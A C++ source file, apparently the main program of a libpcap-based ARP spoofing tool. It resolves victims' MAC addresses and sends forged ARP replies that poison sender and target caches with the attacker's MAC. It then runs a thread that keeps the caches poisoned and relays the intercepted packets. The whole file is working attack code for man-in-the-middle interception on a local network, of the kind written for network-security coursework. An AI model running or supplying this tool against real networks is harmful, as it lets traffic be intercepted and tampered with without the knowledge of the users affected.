#include <cstdio>
#include <pcap.h>
#include <pthread.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <sys/ioctl.h>
#include <net/if.h> 
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>
#include <map>
#include <vector>

// my
#include "util.h"
#include "mainstruct.h"
#include "arpattk.h"

void usage() {
	printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void print_info(char* sender_ip, char* target_ip){
	printf("==========================================================\n");
	printf("[SENDER] %s -> [TARGET] %s\n", sender_ip, target_ip);
	printf("==========================================================\n");
}

int main(int argc, char* argv[]) {
	if (argc < 4 || (argc) % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

    // pcap open
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	struct ifreq attacker_ifr;
    struct ifconf attacker_ifc;
	Mac attacker_mac = Mac(get_host_mac(attacker_ifr, attacker_ifc, dev));
	Ip attacker_ip = Ip(get_host_ip(attacker_ifr, dev));
	std::vector<std::pair<Ip, Mac> > arp_table;

	for(int i = 2; i < argc; i++){
		Ip ip = Ip(argv[i]);
		arp_request(handle, ip, attacker_ip, attacker_mac);
		Mac mac = get_sender_mac(handle, ip, attacker_ip, attacker_mac);
		arp_table.push_back(std::make_pair(ip, mac));
	}
	
	ArpTableThreadArgv *attack_data_table = (ArpTableThreadArgv *)malloc(sizeof(ArpTableThreadArgv) * arp_table.size());
	for(int i = 0; i < arp_table.size(); i += 2){
		attack_data_table[i].handle = handle;
		attack_data_table[i].sender_ip = arp_table[i].first;
		attack_data_table[i].sender_mac = arp_table[i].second;
		attack_data_table[i].target_ip = arp_table[i+1].first;
		attack_data_table[i].target_mac = arp_table[i+1].second;
		attack_data_table[i].attacker_ip = attacker_ip;
		attack_data_table[i].attacker_mac = attacker_mac;

		attack_data_table[i+1].handle = handle;
		attack_data_table[i+1].sender_ip = arp_table[i+1].first;
		attack_data_table[i+1].sender_mac = arp_table[i+1].second;
		attack_data_table[i+1].target_ip = arp_table[i].first;
		attack_data_table[i+1].target_mac = arp_table[i].second;
		attack_data_table[i+1].attacker_ip = attacker_ip;
		attack_data_table[i+1].attacker_mac = attacker_mac;
	}

	struct pcap_pkthdr* pkt_header;
	const u_char* packet;
	EthArpPacket first_reply_packet;

	pthread_t* thread = (pthread_t*)malloc(sizeof(pthread_t));
	infect_argv* thread_argv = (infect_argv*)malloc(sizeof(infect_argv));
	thread_argv->handle = handle;
	thread_argv->size_ = arp_table.size();
	thread_argv->arp_table_ = attack_data_table;

	for(int i = 0; i < arp_table.size(); i++){
		set_arp_packet2(&first_reply_packet, attack_data_table[i].sender_ip, attack_data_table[i].sender_mac, attack_data_table[i].target_ip, attack_data_table[i].attacker_ip, attack_data_table[i].attacker_mac);
		send_arp(handle, first_reply_packet);
	}

	int thread_res = pthread_create(thread, NULL, arp_infect_thread, (void*)thread_argv);
	if(thread_res != 0){
		printf("[error] ARP INFECT THREAD CREATE FAILED\n");
	}

	while(true){
		int res = pcap_next_ex(handle, &pkt_header, &packet);
		if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			continue;
		}

		EthHdr* ethernet = (EthHdr*)packet;
		for(int i = 0; i < arp_table.size(); i++){
			if(attack_data_table[i].sender_mac == ethernet->smac()){
				arp_spoof_flow(handle, pkt_header, packet, &attack_data_table[i]);
				break;
			}
		}
	}

	pthread_join(*thread, NULL);
	pcap_close(handle);
}
